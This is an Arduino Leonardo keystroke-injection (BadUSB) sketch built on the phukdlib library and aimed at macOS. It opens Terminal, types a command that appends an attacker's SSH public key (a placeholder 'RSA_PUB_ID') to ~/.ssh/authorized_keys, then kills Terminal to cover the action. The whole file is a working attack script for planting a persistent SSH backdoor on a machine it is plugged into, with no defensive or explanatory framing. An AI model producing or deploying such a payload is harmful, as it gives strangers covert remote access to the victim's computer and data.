#define kbd_es_es
#include <phukdlib_leonardo.h>

void setup() {
  Keyboard.begin();
}

void loop() {
  delay(5000);
  CommandAtRunBarOSX("terminal");
  delay(5000);
  Keyboard.println("echo 'RSA_PUB_ID' >> ~/.ssh/authorized_keys");
  delay(4000);
  Keyboard.println("killall Terminal");
  while(1);
}
